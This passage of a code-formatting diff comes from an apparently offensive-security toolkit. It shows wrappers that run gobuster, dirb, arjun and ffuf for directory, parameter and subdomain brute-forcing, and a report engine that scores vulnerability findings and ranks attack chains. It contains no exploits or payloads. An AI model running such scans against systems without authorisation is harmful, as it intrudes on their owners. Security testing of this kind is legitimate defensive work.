results\n-\n-def run_gobuster_fuzzing(target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    return results\n+\n+\n+def run_gobuster_fuzzing(\n+    target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run Gobuster directory fuzzing\"\"\"\n     wordlists = get_wordlists()\n     results = {\"endpoints_found\": 0, \"directories\": [], \"files\": []}\n-    \n+\n     wordlist = wordlists.get(\"directories\")\n     if not wordlist:\n         return {\"error\": \"No wordlist found for gobuster\"}\n-    \n+\n     output_file = output_dir / \"gobuster_results.txt\"\n-    \n+\n     cmd = [\n-        \"gobuster\", \"dir\",\n-        \"-u\", target,\n-        \"-w\", str(wordlist),\n-        \"-o\", str(output_file),\n-        \"-t\", str(cfg.get(\"threads\", 50)),\n-        \"-s\", cfg.get(\"status_codes\", \"200,204,301,302,307,308,401,403,405,500\"),\n-        \"-q\"  # Quiet mode\n+        \"gobuster\",\n+        \"dir\",\n+        \"-u\",\n+        target,\n+        \"-w\",\n+        str(wordlist),\n+        \"-o\",\n+        str(output_file),\n+        \"-t\",\n+        str(cfg.get(\"threads\", 50)),\n+        \"-s\",\n+        cfg.get(\"status_codes\", \"200,204,301,302,307,308,401,403,405,500\"),\n+        \"-q\",  # Quiet mode\n     ]\n-    \n+\n     # Add extensions\n     extensions = cfg.get(\"extensions\", \"php,asp,aspx,jsp,html,htm,txt\")\n     if extensions:\n         cmd.extend([\"-x\", extensions])\n-    \n+\n     try:\n         subprocess.run(cmd, timeout=1200, cwd=output_dir, env=env, capture_output=True)\n-        \n+\n         # Parse results\n         if output_file.exists():\n-            with open(output_file, 'r') as f:\n+            with open(output_file, \"r\") as f:\n                 for line in f:\n                     if \"(Status:\" in line:\n                         results[\"endpoints_found\"] += 1\n-                        if line.strip().endswith('/'):\n+                        if line.strip().endswith(\"/\"):\n                             results[\"directories\"].append(line.strip())\n                         else:\n                             results[\"files\"].append(line.strip())\n-    \n+\n     except Exception as e:\n         results[\"error\"] = str(e)\n-    \n-    return results\n-\n-def run_dirb_fuzzing(target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    return results\n+\n+\n+def run_dirb_fuzzing(\n+    target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run Dirb fuzzing\"\"\"\n     wordlists = get_wordlists()\n     results = {\"endpoints_found\": 0, \"directories\": []}\n-    \n+\n     wordlist = wordlists.get(\"directories\")\n     if not wordlist:\n         # Fallback to system wordlist\n         wordlist = Path(\"/usr/share/wordlists/dirb/common.txt\")\n         if not wordlist.exists():\n             return {\"error\": \"No wordlist found for dirb\"}\n-    \n+\n     output_file = output_dir / \"dirb_results.txt\"\n-    \n+\n     cmd = [\n-        \"dirb\", target, str(wordlist),\n-        \"-o\", str(output_file),\n-        \"-w\"  # Don't stop on warning\n+        \"dirb\",\n+        target,\n+        str(wordlist),\n+        \"-o\",\n+        str(output_file),\n+        \"-w\",  # Don't stop on warning\n     ]\n-    \n+\n     try:\n         subprocess.run(cmd, timeout=1200, cwd=output_dir, env=env, capture_output=True)\n-        \n-        # Parse results  \n+\n+        # Parse results\n         if output_file.exists():\n-            with open(output_file, 'r') as f:\n+            with open(output_file, \"r\") as f:\n                 content = f.read()\n                 # Count found directories\n-                lines = content.split('\\n')\n+                lines = content.split(\"\\n\")\n                 for line in lines:\n                     if \"==> DIRECTORY:\" in line or \"CODE:200\" in line:\n                         results[\"endpoints_found\"] += 1\n                         results[\"directories\"].append(line.strip())\n-    \n+\n     except Exception as e:\n         results[\"error\"] = str(e)\n-    \n-    return results\n-\n-def run_parameter_fuzzing(target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    return results\n+\n+\n+def run_parameter_fuzzing(\n+    target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run parameter fuzzing\"\"\"\n     results = {\"parameters_found\": 0, \"parameters\": []}\n-    \n+\n     # Use arjun if available\n     if shutil.which(\"arjun\"):\n         output_file = output_dir / \"arjun_parameters.txt\"\n-        \n+\n         cmd = [\n             \"arjun\",\n-            \"-u\", target,\n-            \"-o\", str(output_file),\n-            \"-t\", str(cfg.get(\"threads\", 20))\n+            \"-u\",\n+            target,\n+            \"-o\",\n+            str(output_file),\n+            \"-t\",\n+            str(cfg.get(\"threads\", 20)),\n         ]\n-        \n+\n         try:\n-            subprocess.run(cmd, timeout=600, cwd=output_dir, env=env, capture_output=True)\n-            \n+            subprocess.run(\n+                cmd, timeout=600, cwd=output_dir, env=env, capture_output=True\n+            )\n+\n             if output_file.exists():\n-                with open(output_file, 'r') as f:\n+                with open(output_file, \"r\") as f:\n                     for line in f:\n                         if line.strip():\n                             results[\"parameters_found\"] += 1\n                             results[\"parameters\"].append(line.strip())\n-        \n+\n         except Exception as e:\n             results[\"error\"] = str(e)\n-    \n-    return results\n-\n-def run_subdomain_fuzzing(target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    return results\n+\n+\n+def run_subdomain_fuzzing(\n+    target: str, output_dir: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+) -> Dict[str, Any]:\n     \"\"\"Run subdomain fuzzing\"\"\"\n     results = {\"subdomains_found\": 0, \"subdomains\": []}\n-    \n+\n     # Extract domain from target\n     domain = target.replace(\"http://\", \"\").replace(\"https://\", \"\").split(\"/\")[0]\n-    \n+\n     # Get subdomain wordlist\n     base_path = Path(__file__).parent.parent\n     subdomain_wordlists = [\n-        base_path / \"external_lists\" / \"SecLists\" / \"Discovery\" / \"DNS\" / \"subdomains-top1million-110000.txt\",\n-        base_path / \"external_lists\" / \"commonspeak2-wordlists\" / \"subdomains\" / \"subdomains.txt\"\n+        base_path\n+        / \"external_lists\"\n+        / \"SecLists\"\n+        / \"Discovery\"\n+        / \"DNS\"\n+        / \"subdomains-top1million-110000.txt\",\n+        base_path\n+        / \"external_lists\"\n+        / \"commonspeak2-wordlists\"\n+        / \"subdomains\"\n+        / \"subdomains.txt\",\n     ]\n-    \n+\n     wordlist = None\n     for wl in subdomain_wordlists:\n         if wl.exists():\n             wordlist = wl\n             break\n-    \n+\n     if not wordlist:\n         return {\"error\": \"No subdomain wordlist found\"}\n-    \n+\n     # Use ffuf for subdomain fuzzing\n     if shutil.which(\"ffuf\"):\n         output_file = output_dir / \"subdomain_fuzzing.json\"\n-        \n+\n         cmd = [\n             \"ffuf\",\n-            \"-u\", f\"http://FUZZ.{domain}\",\n-            \"-w\", str(wordlist),\n-            \"-o\", str(output_file),\n-            \"-of\", \"json\",\n-            \"-mc\", \"200,201,202,204,301,302,303,307,308,401,403,405\",\n-            \"-t\", str(cfg.get(\"threads\", 50)),\n-            \"-timeout\", \"10\",\n-            \"-s\"\n+            \"-u\",\n+            f\"http://FUZZ.{domain}\",\n+            \"-w\",\n+            str(wordlist),\n+            \"-o\",\n+            str(output_file),\n+            \"-of\",\n+            \"json\",\n+            \"-mc\",\n+            \"200,201,202,204,301,302,303,307,308,401,403,405\",\n+            \"-t\",\n+            str(cfg.get(\"threads\", 50)),\n+            \"-timeout\",\n+            \"10\",\n+            \"-s\",\n         ]\n-        \n+\n         try:\n-            subprocess.run(cmd, timeout=600, cwd=output_dir, env=env, capture_output=True)\n-            \n+            subprocess.run(\n+                cmd, timeout=600, cwd=output_dir, env=env, capture_output=True\n+            )\n+\n             if output_file.exists():\n-                with open(output_file, 'r') as f:\n+                with open(output_file, \"r\") as f:\n                     ffuf_data = json.load(f)\n-                    \n+\n                 for result in ffuf_data.get(\"results\", []):\n                     results[\"subdomains_found\"] += 1\n                     subdomain = result.get(\"input\", {}).get(\"FUZZ\", \"\")\n                     if subdomain:\n                         results[\"subdomains\"].append(f\"{subdomain}.{domain}\")\n-        \n+\n         except Exception as e:\n             results[\"error\"] = str(e)\n-    \n-    return results\n\\ No newline at end of file\n+\n+    return results\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/intelligent_report_engine.py\t2025-09-14 19:10:58.551754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/intelligent_report_engine.py\t2025-09-14 19:23:12.994107+00:00\n@@ -19,19 +19,21 @@\n import re\n \n \n class ThreatLevel(Enum):\n     \"\"\"Threat level enumeration with numerical values for calculations\"\"\"\n+\n     CRITICAL = 5\n     HIGH = 4\n     MEDIUM = 3\n     LOW = 2\n     INFORMATIONAL = 1\n \n \n class AttackVector(Enum):\n     \"\"\"Attack vector categories for vulnerability classification\"\"\"\n+\n     NETWORK = \"network\"\n     WEB_APPLICATION = \"web_application\"\n     SYSTEM = \"system\"\n     CONFIGURATION = \"configuration\"\n     SOCIAL_ENGINEERING = \"social_engineering\"\n@@ -39,10 +41,11 @@\n \n \n @dataclass\n class VulnerabilityContext:\n     \"\"\"Enhanced vulnerability context with intelligent analysis\"\"\"\n+\n     id: str\n     name: str\n     severity: str\n     description: str\n     template_id: str\n@@ -60,10 +63,11 @@\n \n \n @dataclass\n class ThreatIntelligence:\n     \"\"\"Aggregated threat intelligence data\"\"\"\n+\n     reputation_score: float  # 0-100, lower is worse\n     known_malicious_ips: List[str]\n     suspicious_domains: List[str]\n     threat_feeds: Dict[str, Any]\n     geolocation_risks: Dict[str, float]\n@@ -72,43 +76,44 @@\n \n \n @dataclass\n class BusinessContext:\n     \"\"\"Business context for risk assessment\"\"\"\n+\n     asset_criticality: float  # 1-10 scale\n     data_sensitivity: float  # 1-10 scale\n     availability_requirement: float  # 1-10 scale\n     compliance_requirements: List[str]\n     business_hours_impact: float\n     revenue_impact_per_hour: float\n \n \n class IntelligentReportAnalyzer:\n     \"\"\"Advanced report analyzer with deep thinking capabilities\"\"\"\n-    \n+\n     def __init__(self, config: Dict[str, Any]):\n         self.config = config\n         self.logger = logging.getLogger(__name__)\n         self.vulnerability_patterns = {}\n         self.attack_signatures = {}\n         self.false_positive_patterns = []\n         self.threat_landscape = {}\n-        \n+\n         # Initialize intelligence databases\n         self._initialize_intelligence_db()\n-    \n+\n     def _initialize_intelligence_db(self):\n         \"\"\"Initialize threat intelligence and vulnerability pattern databases\"\"\"\n         # Common false positive patterns\n         self.false_positive_patterns = [\n             r\"tech-detect-.*\",\n             r\".*-version-detect\",\n             r\".*-info-disclosure\",\n             r\".*-default-page\",\n-            r\".*-status-page\"\n+            r\".*-status-page\",\n         ]\n-        \n+\n         # Attack vector mapping\n         self.attack_vector_mapping = {\n             \"sqli\": AttackVector.WEB_APPLICATION,\n             \"xss\": AttackVector.WEB_APPLICATION,\n             \"rce\": AttackVector.WEB_APPLICATION,\n@@ -128,60 +133,66 @@\n             \"dns\": AttackVector.NETWORK,\n             \"config\": AttackVector.CONFIGURATION,\n             \"default\": AttackVector.CONFIGURATION,\n             \"exposed\": AttackVector.CONFIGURATION,\n             \"backup\": AttackVector.CONFIGURATION,\n-            \"debug\": AttackVector.CONFIGURATION\n-        }\n-    \n-    def analyze_vulnerability_intelligence(self, vulnerabilities: List[Dict[str, Any]]) -> List[VulnerabilityContext]:\n+            \"debug\": AttackVector.CONFIGURATION,\n+        }\n+\n+    def analyze_vulnerability_intelligence(\n+        self, vulnerabilities: List[Dict[str, Any]]\n+    ) -> List[VulnerabilityContext]:\n         \"\"\"Apply intelligent analysis to vulnerability data\"\"\"\n         enhanced_vulns = []\n-        \n+\n         for vuln in vulnerabilities:\n             try:\n                 context = self._create_vulnerability_context(vuln)\n                 enhanced_vulns.append(context)\n             except Exception as e:\n                 self.logger.warning(f\"Failed to analyze vulnerability: {e}\")\n-        \n+\n         # Apply correlation analysis\n         enhanced_vulns = self._correlate_vulnerabilities(enhanced_vulns)\n-        \n+\n         return enhanced_vulns\n-    \n-    def _create_vulnerability_context(self, vuln: Dict[str, Any]) -> VulnerabilityContext:\n+\n+    def _create_vulnerability_context(\n+        self, vuln: Dict[str, Any]\n+    ) -> VulnerabilityContext:\n         \"\"\"Create enhanced vulnerability context with intelligent analysis\"\"\"\n         info = vuln.get(\"info\", {})\n         template_id = vuln.get(\"template-id\", \"unknown\")\n-        \n+\n         # Determine attack vector\n         attack_vector = self._determine_attack_vector(template_id)\n-        \n+\n         # Calculate CVSS score if not available\n         cvss_score = self._calculate_cvss_score(vuln)\n-        \n+\n         # Calculate exploitability\n         exploitability = self._calculate_exploitability(vuln)\n-        \n+\n         # Calculate confidence score\n         confidence = self._calculate_confidence_score(vuln)\n-        \n+\n         # Calculate business impact\n         business_impact = self._calculate_business_impact(vuln)\n-        \n+\n         # Determine remediation complexity\n         remediation_complexity = self._calculate_remediation_complexity(vuln)\n-        \n+\n         # Check for public exploits\n         public_exploit_available = self._check_public_exploits(template_id)\n-        \n+\n         # Gather threat intelligence\n         threat_intel = self._gather_threat_intelligence(vuln)\n-        \n+\n         return VulnerabilityContext(\n-            id=hashlib.md5(f\"{template_id}_{vuln.get('matched-at', '')}\".encode()).hexdigest(),\n+            id=hashlib.md5(\n+                f\"{template_id}_{vuln.get('matched-at', '')}\".encode()\n+            ).hexdigest(),\n             name=info.get(\"name\", \"Unknown Vulnerability\"),\n             severity=info.get(\"severity\", \"unknown\"),\n             description=info.get(\"description\", \"\"),\n             template_id=template_id,\n             target=vuln.get(\"matched-at\", \"\"),\n@@ -192,310 +203,343 @@\n             business_impact=business_impact,\n             remediation_complexity=remediation_complexity,\n             public_exploit_available=public_exploit_available,\n             threat_intelligence=threat_intel,\n             related_vulnerabilities=[],\n-            attack_chain_position=0\n+            attack_chain_position=0,\n         )\n-    \n+\n     def _determine_attack_vector(self, template_id: str) -> AttackVector:\n         \"\"\"Intelligently determine the attack vector based on template ID\"\"\"\n         template_lower = template_id.lower()\n-        \n+\n         for pattern, vector in self.attack_vector_mapping.items():\n             if pattern in template_lower:\n                 return vector\n-        \n+\n         return AttackVector.WEB_APPLICATION  # Default\n-    \n+\n     def _calculate_cvss_score(self, vuln: Dict[str, Any]) -> float:\n         \"\"\"Calculate CVSS score based on vulnerability characteristics\"\"\"\n         info = vuln.get(\"info\", {})\n         severity = info.get(\"severity\", \"unknown\").lower()\n-        \n+\n         # Base CVSS scores by severity\n         base_scores = {\n             \"critical\": 9.5,\n             \"high\": 7.5,\n             \"medium\": 5.5,\n             \"low\": 3.0,\n             \"info\": 1.0,\n-            \"unknown\": 2.0\n-        }\n-        \n+            \"unknown\": 2.0,\n+        }\n+\n         base_score = base_scores.get(severity, 2.0)\n-        \n+\n         # Adjust based on template characteristics\n         template_id = vuln.get(\"template-id\", \"\")\n-        \n+\n         if \"rce\" in template_id.lower():\n             base_score = min(base_score + 2.0, 10.0)\n         elif \"sqli\" in template_id.lower():\n             base_score = min(base_score + 1.5, 10.0)\n         elif \"xss\" in template_id.lower():\n             base_score = min(base_score + 1.0, 10.0)\n         elif \"auth-bypass\" in template_id.lower():\n             base_score = min(base_score + 1.8, 10.0)\n-        \n+\n         return round(base_score, 1)\n-    \n+\n     def _calculate_exploitability(self, vuln: Dict[str, Any]) -> float:\n         \"\"\"Calculate exploitability score (0-1)\"\"\"\n         template_id = vuln.get(\"template-id\", \"\").lower()\n-        \n+\n         # Base exploitability\n         exploitability = 0.5\n-        \n+\n         # High exploitability indicators\n-        if any(pattern in template_id for pattern in [\"rce\", \"sqli\", \"auth-bypass\", \"upload\"]):\n+        if any(\n+            pattern in template_id\n+            for pattern in [\"rce\", \"sqli\", \"auth-bypass\", \"upload\"]\n+        ):\n             exploitability += 0.3\n-        \n+\n         # Network accessibility\n         if \"exposed\" in template_id or \"public\" in template_id:\n             exploitability += 0.2\n-        \n+\n         # Low exploitability indicators\n         if any(pattern in template_id for pattern in [\"info\", \"detect\", \"version\"]):\n             exploitability -= 0.3\n-        \n+\n         return max(0.0, min(1.0, exploitability))\n-    \n+\n     def _calculate_confidence_score(self, vuln: Dict[str, Any]) -> float:\n         \"\"\"Calculate confidence score for vulnerability (0-1)\"\"\"\n         template_id = vuln.get(\"template-id\", \"\")\n-        \n+\n         # Start with base confidence\n         confidence = 0.8\n-        \n+\n         # Reduce confidence for common false positives\n         for pattern in self.false_positive_patterns:\n             if re.match(pattern, template_id):\n                 confidence *= 0.4\n                 break\n-        \n+\n         # Increase confidence for well-validated templates\n         if template_id.startswith(\"CVE-\"):\n             confidence = min(confidence * 1.3, 1.0)\n-        \n+\n         # Check response patterns for verification\n         response = vuln.get(\"response\", \"\")\n-        if response and any(indicator in response.lower() for indicator in [\"error\", \"exception\", \"sql\", \"root:\"]):\n+        if response and any(\n+            indicator in response.lower()\n+            for indicator in [\"error\", \"exception\", \"sql\", \"root:\"]\n+        ):\n             confidence = min(confidence * 1.2, 1.0)\n-        \n+\n         return round(confidence, 2)\n-    \n+\n     def _calculate_business_impact(self, vuln: Dict[str, Any]) -> float:\n         \"\"\"Calculate potential business impact (0-10 scale)\"\"\"\n         template_id = vuln.get(\"template-id\", \"\").lower()\n         severity = vuln.get(\"info\", {}).get(\"severity\", \"unknown\").lower()\n-        \n+\n         # Base impact by severity\n         impact_mapping = {\n             \"critical\": 9.0,\n             \"high\": 7.0,\n             \"medium\": 5.0,\n             \"low\": 3.0,\n-            \"info\": 1.0\n-        }\n-        \n+            \"info\": 1.0,\n+        }\n+\n         base_impact = impact_mapping.get(severity, 2.0)\n-        \n+\n         # Adjust based on vulnerability type\n         if \"rce\" in template_id:\n             base_impact = min(base_impact + 2.0, 10.0)\n         elif \"auth-bypass\" in template_id:\n             base_impact = min(base_impact + 1.8, 10.0)\n         elif \"sqli\" in template_id:\n             base_impact = min(base_impact + 1.5, 10.0)\n         elif \"data\" in template_id or \"leak\" in template_id:\n             base_impact = min(base_impact + 1.3, 10.0)\n-        \n+\n         return round(base_impact, 1)\n-    \n+\n     def _calculate_remediation_complexity(self, vuln: Dict[str, Any]) -> int:\n         \"\"\"Calculate remediation complexity (1-5 scale, 5 being most complex)\"\"\"\n         template_id = vuln.get(\"template-id\", \"\").lower()\n-        \n+\n         # Default complexity\n         complexity = 2\n-        \n+\n         # High complexity scenarios\n-        if any(pattern in template_id for pattern in [\"ssl\", \"tls\", \"crypto\", \"design\"]):\n+        if any(\n+            pattern in template_id for pattern in [\"ssl\", \"tls\", \"crypto\", \"design\"]\n+        ):\n             complexity = 4\n         elif any(pattern in template_id for pattern in [\"auth\", \"session\", \"cors\"]):\n             complexity = 3\n         elif any(pattern in template_id for pattern in [\"config\", \"header\", \"default\"]):\n             complexity = 2\n         elif any(pattern in template_id for pattern in [\"patch\", \"update\", \"version\"]):\n             complexity = 1\n-        \n+\n         return max(1, min(5, complexity))\n-    \n+\n     def _check_public_exploits(self, template_id: str) -> bool:\n         \"\"\"Check if public exploits are available for this vulnerability\"\"\"\n         # This would typically query exploit databases\n         # For now, use heuristics based on template ID\n-        \n+\n         exploit_indicators = [\"cve-\", \"rce\", \"sqli\", \"upload\", \"deserial\"]\n         return any(indicator in template_id.lower() for indicator in exploit_indicators)\n-    \n+\n     def _gather_threat_intelligence(self, vuln: Dict[str, Any]) -> Dict[str, Any]:\n         \"\"\"Gather threat intelligence for vulnerability\"\"\"\n         # This would typically query multiple threat intelligence sources\n         # For now, return basic intelligence based on vulnerability characteristics\n-        \n+\n         template_id = vuln.get(\"template-id\", \"\")\n-        \n+\n         intelligence = {\n             \"threat_feeds\": {},\n             \"exploit_availability\": self._check_public_exploits(template_id),\n             \"attack_frequency\": self._estimate_attack_frequency(template_id),\n             \"attribution\": [],\n-            \"iocs\": []\n-        }\n-        \n+            \"iocs\": [],\n+        }\n+\n         return intelligence\n-    \n+\n     def _estimate_attack_frequency(self, template_id: str) -> str:\n         \"\"\"Estimate how frequently this vulnerability type is attacked\"\"\"\n         template_lower = template_id.lower()\n-        \n+\n         if any(pattern in template_lower for pattern in [\"sqli\", \"xss\", \"rce\"]):\n             return \"very_high\"\n-        elif any(pattern in template_lower for pattern in [\"upload\", \"auth-bypass\", \"lfi\"]):\n+        elif any(\n+            pattern in template_lower for pattern in [\"upload\", \"auth-bypass\", \"lfi\"]\n+        ):\n             return \"high\"\n         elif any(pattern in template_lower for pattern in [\"csrf\", \"cors\", \"ssrf\"]):\n             return \"medium\"\n         else:\n             return \"low\"\n-    \n-    def _correlate_vulnerabilities(self, vulnerabilities: List[VulnerabilityContext]) -> List[VulnerabilityContext]:\n+\n+    def _correlate_vulnerabilities(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[VulnerabilityContext]:\n         \"\"\"Apply correlation analysis to identify related vulnerabilities\"\"\"\n         # Group by target\n         target_groups = defaultdict(list)\n         for vuln in vulnerabilities:\n             target_groups[vuln.target].append(vuln)\n-        \n+\n         # Find correlations within each target\n         for target, vulns in target_groups.items():\n             self._find_attack_chains(vulns)\n             self._identify_related_vulnerabilities(vulns)\n-        \n+\n         return vulnerabilities\n-    \n+\n     def _find_attack_chains(self, vulnerabilities: List[VulnerabilityContext]):\n         \"\"\"Identify potential attack chains\"\"\"\n         # Sort by exploitability and impact\n-        sorted_vulns = sorted(vulnerabilities, key=lambda v: v.exploitability * v.business_impact, reverse=True)\n-        \n+        sorted_vulns = sorted(\n+            vulnerabilities,\n+            key=lambda v: v.exploitability * v.business_impact,\n+            reverse=True,\n+        )\n+\n         for i, vuln in enumerate(sorted_vulns):\n             vuln.attack_chain_position = i + 1\n-    \n-    def _identify_related_vulnerabilities(self, vulnerabilities: List[VulnerabilityContext]):\n+\n+    def _identify_related_vulnerabilities(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ):\n         \"\"\"Identify relationships between vulnerabilities\"\"\"\n         for i, vuln1 in enumerate(vulnerabilities):\n             related = []\n             for j, vuln2 in enumerate(vulnerabilities):\n                 if i != j and self._are_vulnerabilities_related(vuln1, vuln2):\n                     related.append(vuln2.id)\n             vuln1.related_vulnerabilities = related\n-    \n-    def _are_vulnerabilities_related(self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext) -> bool:\n+\n+    def _are_vulnerabilities_related(\n+        self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext\n+    ) -> bool:\n         \"\"\"Check if two vulnerabilities are related\"\"\"\n         # Same attack vector\n         if vuln1.attack_vector == vuln2.attack_vector:\n             return True\n-        \n+\n         # Similar template patterns\n         if self._templates_similar(vuln1.template_id, vuln2.template_id):\n             return True\n-        \n+\n         # Complementary vulnerabilities (e.g., auth bypass + privilege escalation)\n         complementary_pairs = [\n             (\"auth-bypass\", \"privilege\"),\n             (\"upload\", \"rce\"),\n             (\"lfi\", \"rce\"),\n-            (\"sqli\", \"privilege\")\n+            (\"sqli\", \"privilege\"),\n         ]\n-        \n+\n         for pair in complementary_pairs:\n-            if (pair[0] in vuln1.template_id.lower() and pair[1] in vuln2.template_id.lower()) or \\\n-               (pair[1] in vuln1.template_id.lower() and pair[0] in vuln2.template_id.lower()):\n+            if (\n+                pair[0] in vuln1.template_id.lower()\n+                and pair[1] in vuln2.template_id.lower()\n+            ) or (\n+                pair[1] in vuln1.template_id.lower()\n+                and pair[0] in vuln2.template_id.lower()\n+            ):\n                 return True\n-        \n+\n         return False\n-    \n+\n     def _templates_similar(self, template1: str, template2: str) -> bool:\n         \"\"\"Check if two templates are similar\"\"\"\n         # Extract base patterns\n-        pattern1 = re.sub(r'-\\d+$', '', template1.lower())\n-        pattern2 = re.sub(r'-\\d+$', '', template2.lower())\n-        \n+        pattern1 = re.sub(r\"-\\d+$\", \"\", template1.lower())\n+        pattern2 = re.sub(r\"-\\d+$\", \"\", template2.lower())\n+\n         return pattern1 == pattern2\n \n \n class AdvancedRiskCalculator:\n     \"\"\"Advanced risk calculation with contextual threat modeling\"\"\"\n-    \n+\n     def __init__(self, business_context: Optional[BusinessContext] = None):\n         self.business_context = business_context or self._default_business_context()\n         self.logger = logging.getLogger(__name__)\n-    \n+\n     def _default_business_context(self) -> BusinessContext:\n         \"\"\"Create default business context\"\"\"\n         return BusinessContext(\n             asset_criticality=5.0,\n             data_sensitivity=5.0,\n             availability_requirement=5.0,\n             compliance_requirements=[\"GDPR\", \"SOX\"],\n             business_hours_impact=1.0,\n-            revenue_impact_per_hour=1000.0\n+            revenue_impact_per_hour=1000.0,\n         )\n-    \n-    def calculate_contextual_risk(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def calculate_contextual_risk(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Calculate risk with business context\"\"\"\n         if not vulnerabilities:\n             return self._empty_risk_assessment()\n-        \n+\n         # Group vulnerabilities by severity and attack vector\n         severity_groups = defaultdict(list)\n         vector_groups = defaultdict(list)\n-        \n+\n         for vuln in vulnerabilities:\n             severity_groups[vuln.severity.lower()].append(vuln)\n             vector_groups[vuln.attack_vector].append(vuln)\n-        \n+\n         # Calculate base risk metrics\n         base_risk = self._calculate_base_risk(severity_groups)\n-        \n+\n         # Apply business context multipliers\n         contextual_risk = self._apply_business_context(base_risk, vulnerabilities)\n-        \n+\n         # Calculate attack vector distribution\n         vector_distribution = self._calculate_vector_distribution(vector_groups)\n-        \n+\n         # Identify critical attack paths\n         critical_paths = self._identify_critical_attack_paths(vulnerabilities)\n-        \n+\n         # Generate risk insights\n         insights = self._generate_risk_insights(vulnerabilities, contextual_risk)\n-        \n+\n         return {\n             \"overall_risk_score\": contextual_risk[\"total_score\"],\n             \"risk_level\": contextual_risk[\"risk_level\"],\n             \"business_impact_score\": contextual_risk[\"business_impact\"],\n             \"likelihood_score\": contextual_risk[\"likelihood\"],\n-            \"severity_breakdown\": {sev: len(vulns) for sev, vulns in severity_groups.items()},\n+            \"severity_breakdown\": {\n+                sev: len(vulns) for sev, vulns in severity_groups.items()\n+            },\n             \"attack_vector_distribution\": vector_distribution,\n             \"critical_attack_paths\": critical_paths,\n             \"time_to_compromise\": self._estimate_time_to_compromise(vulnerabilities),\n-            \"remediation_priority\": self._calculate_remediation_priority(vulnerabilities),\n+            \"remediation_priority\": self._calculate_remediation_priority(\n+                vulnerabilities\n+            ),\n             \"compliance_impact\": self._assess_compliance_impact(vulnerabilities),\n             \"risk_insights\": insights,\n-            \"recommendations\": self._generate_contextual_recommendations(vulnerabilities, contextual_risk)\n-        }\n-    \n+            \"recommendations\": self._generate_contextual_recommendations(\n+                vulnerabilities, contextual_risk\n+            ),\n+        }\n+\n     def _empty_risk_assessment(self) -> Dict[str, Any]:\n         \"\"\"Return empty risk assessment\"\"\"\n         return {\n             \"overall_risk_score\": 0,\n             \"risk_level\": \"MINIMAL\",\n@@ -506,58 +550,73 @@\n             \"critical_attack_paths\": [],\n             \"time_to_compromise\": \"N/A\",\n             \"remediation_priority\": [],\n             \"compliance_impact\": [],\n             \"risk_insights\": [],\n-            \"recommendations\": [\"No vulnerabilities detected\", \"Continue regular security monitoring\"]\n-        }\n-    \n-    def _calculate_base_risk(self, severity_groups: Dict[str, List[VulnerabilityContext]]) -> Dict[str, float]:\n+            \"recommendations\": [\n+                \"No vulnerabilities detected\",\n+                \"Continue regular security monitoring\",\n+            ],\n+        }\n+\n+    def _calculate_base_risk(\n+        self, severity_groups: Dict[str, List[VulnerabilityContext]]\n+    ) -> Dict[str, float]:\n         \"\"\"Calculate base risk scores\"\"\"\n         severity_weights = {\n             \"critical\": 10.0,\n             \"high\": 7.0,\n             \"medium\": 4.0,\n             \"low\": 2.0,\n             \"info\": 0.5,\n             \"informational\": 0.5,\n-            \"unknown\": 1.0\n-        }\n-        \n+            \"unknown\": 1.0,\n+        }\n+\n         total_score = 0\n         for severity, vulns in severity_groups.items():\n             weight = severity_weights.get(severity, 1.0)\n             # Apply diminishing returns for multiple vulnerabilities of same severity\n-            count_factor = min(len(vulns), 10) + (len(vulns) - 10) * 0.1 if len(vulns) > 10 else len(vulns)\n+            count_factor = (\n+                min(len(vulns), 10) + (len(vulns) - 10) * 0.1\n+                if len(vulns) > 10\n+                else len(vulns)\n+            )\n             total_score += weight * count_factor\n-        \n+\n         return {\n             \"total_score\": total_score,\n-            \"normalized_score\": min(total_score / 100.0, 1.0) * 10.0\n-        }\n-    \n-    def _apply_business_context(self, base_risk: Dict[str, float], vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+            \"normalized_score\": min(total_score / 100.0, 1.0) * 10.0,\n+        }\n+\n+    def _apply_business_context(\n+        self, base_risk: Dict[str, float], vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Apply business context to risk calculation\"\"\"\n         base_score = base_risk[\"total_score\"]\n-        \n+\n         # Calculate business impact multiplier\n         impact_multiplier = (\n-            self.business_context.asset_criticality +\n-            self.business_context.data_sensitivity +\n-            self.business_context.availability_requirement\n+            self.business_context.asset_criticality\n+            + self.business_context.data_sensitivity\n+            + self.business_context.availability_requirement\n         ) / 30.0  # Normalize to 0-1\n-        \n+\n         # Calculate likelihood based on exploitability\n-        avg_exploitability = statistics.mean([v.exploitability for v in vulnerabilities]) if vulnerabilities else 0\n-        \n+        avg_exploitability = (\n+            statistics.mean([v.exploitability for v in vulnerabilities])\n+            if vulnerabilities\n+            else 0\n+        )\n+\n         # Apply context\n         business_impact = base_score * impact_multiplier\n         likelihood = avg_exploitability * 10.0\n-        \n+\n         # Calculate final risk score\n         risk_score = (business_impact * 0.7) + (likelihood * 0.3)\n-        \n+\n         # Determine risk level\n         if risk_score >= 80:\n             risk_level = \"CRITICAL\"\n         elif risk_score >= 60:\n             risk_level = 